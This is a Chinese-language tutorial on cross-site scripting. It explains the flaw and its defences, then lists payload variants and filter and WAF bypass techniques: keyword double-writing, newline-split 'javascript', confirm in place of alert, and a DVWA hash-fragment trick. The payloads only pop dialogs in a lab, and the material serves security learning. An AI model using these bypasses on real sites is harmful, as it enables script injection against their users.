  

## 一、XSS（跨站脚本）概述

跨站脚本(Cross-Site
Scripting，简称为XSS或跨站脚本或跨站脚本攻击)是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种。它允许恶意用户将代码注入网页，其他用户在浏览网页时就会受到影响。恶意用户利用XSS代码攻击成功后，可能得到很高的权限（如执行一些操作)、私密网页内容、会话和cookie等各种内容。

XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。

XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。

形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。

因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:

输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;

输出转义：根据输出点的位置对输出到前端的内容进行适当转义;

## 二、XSS的一些变形

### 1、大小写和双写绕过

<sCRIpt>aLert(1)</sCRIPT>

<scscriptript>alert(1)</scscriptript>

### 2、a标签

<a href=”javascript:onclick=alert(1)”>test</a>

<a href=javascript:alert(1)>test</a>

### 3、src属性

<img src=x onerror=alert(1)>

<img/src=x onerror=alert(1)>

<video src=x onerror=alert(1)>

<audio src=x onerror=alert(1)>

<iframe src=”javascript:alert(1)”>

### 4、利用事件绕过

<svg onload=alert(1)><body onload=alert(1)>

<select autofogus onfocus=alert(1)>

<textarea autofocus onfocus=alert(1)>

<video><source onerror="javascript:alert(1)">

<iframe onload=alert(1)>

## 三、XSS绕过的示例

### 1、script、on等被处理（字符被转化为空时可尝试双写） ** **；****

输入script、on等关键字，f12发现都被处理了；

![](https://image.3001.net/images/20201130/1606723280_5fc4a6d075bc58fc25f4b.png!small)

通过尝试发现javascript没有被处理；

![1606723386_5fc4a73acd875cdd0978e.png!small?1606723389229](https://image.3001.net/images/20201130/1606723386_5fc4a73acd875cdd0978e.png!small?1606723389229)

构建payload："><a href=javascript:alert(1)>即可绕过；

![1606723458_5fc4a782b8f1ea51c7b35.png!small?1606723461127](https://image.3001.net/images/20201130/1606723458_5fc4a782b8f1ea51c7b35.png!small?1606723461127)

### 2、过滤严格时，javascript也会被过滤；

输入script、on、javascript等关键字，抓包发现都被处理了；

![1606723832_5fc4a8f86b3059bbe88d9.png!small?1606723834948](https://image.3001.net/images/20201130/1606723832_5fc4a8f86b3059bbe88d9.png!small?1606723834948)

构建payload：javascr%0aipt:alert(1);(在url中输入，或者抓包修改也可）这里用%0a或者%0D达到换行的效果，以此来绕过；

![1606724057_5fc4a9d9ce2e04b3288a1.png!small?1606724060248](https://image.3001.net/images/20201130/1606724057_5fc4a9d9ce2e04b3288a1.png!small?1606724060248)

### 3、如何绕过alert关键词

输入alert后被waf检测到，并且无法绕过；

![1606724258_5fc4aaa2eb48c7e724cbe.png!small?1606724261250](https://image.3001.net/images/20201130/1606724258_5fc4aaa2eb48c7e724cbe.png!small?1606724261250)

更换函数，构建payload：<script>confirm(/xss/)</script>;（除了confirm还可以使用prompt代替alert）即可绕过；

![1606724486_5fc4ab8606004649d80aa.png!small?1606724488467](https://image.3001.net/images/20201130/1606724486_5fc4ab8606004649d80aa.png!small?1606724488467)

### 4、白名单绕过

在dvwa靶场中，关于xssdom型high难度就是关于白名单绕多；无论输入什么关键词都会被重定向；

![1606724898_5fc4ad22eeea9f899dd77.png!small?1606724901401](https://image.3001.net/images/20201130/1606724898_5fc4ad22eeea9f899dd77.png!small?1606724901401)

![1606724907_5fc4ad2b7d4dc5c8be594.png!small?1606724909948](https://image.3001.net/images/20201130/1606724907_5fc4ad2b7d4dc5c8be594.png!small?1606724909948)

我们可以在English后面加一个#，然后在打入语句即可绕过，（#与前面的内容要加一个空格）；

payload：http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=English
#<script>alert(1)</script>;

![1606725030_5fc4ada65fae3f38f0437.png!small?1606725032781](https://image.3001.net/images/20201130/1606725030_5fc4ada65fae3f38f0437.png!small?1606725032781)

## 三、总结

到此为止，本篇文章已经到尾声了，通过这次学习，让我们掌握了更多关于xss的绕过方法，相信大家对于xss的绕过有了更深层次了了解。

  

